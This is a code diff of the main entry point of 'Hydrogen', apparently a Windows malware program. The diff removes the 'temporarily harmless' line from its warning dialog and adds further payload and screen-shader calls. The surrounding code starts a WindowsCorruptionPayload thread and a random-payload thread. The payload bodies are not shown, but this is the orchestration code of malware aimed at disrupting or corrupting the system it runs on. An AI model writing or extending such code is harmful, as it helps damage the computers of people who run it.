@@ -13,10 +13,11 @@ int WinMain(
 	_In_ LPSTR lpCmdLine,
 	_In_ int nShowCmd
 ) {
-	int msgResult = MessageBox(NULL, L"!!!Hydrogen is still in development!!!\nit's temporarily harmless\nExecute it?", L"Hydrogen - WARNING", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
+	int msgResult = MessageBox(NULL, L"!!!Hydrogen is still in development!!!\nExecute it?", L"Hydrogen - Version 0.3.26", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
 	if (msgResult != IDYES) {
 		ExitProcess(0);
 	}
+
 	AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM] = {0};
 	pAudioSequences[0] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence1 };
 	pAudioSequences[1] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence2 };
@@ -45,6 +46,7 @@ int WinMain(
 	ExecutePayload(Payload7, PAYLOAD_TIME);
 	ExecutePayload(Payload8, PAYLOAD_TIME);
 	ExecutePayload(Payload9, PAYLOAD_TIME);
+	ExecutePayload(Payload10, PAYLOAD_TIME);
 
 	ExecuteShader(Shader1, PAYLOAD_TIME);
 	ExecuteShader(Shader2, PAYLOAD_TIME);
@@ -60,6 +62,8 @@ int WinMain(
 	ExecuteShader(Shader12, PAYLOAD_TIME);
 	ExecuteShader(Shader13, PAYLOAD_TIME);
 	ExecuteShader(Shader14, PAYLOAD_TIME);
+	ExecuteShader(Shader15, PAYLOAD_TIME);
+	ExecuteShader(Shader16, PAYLOAD_TIME);
 
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(RandomExecutePayload), (PVOID)1000, 0, NULL);
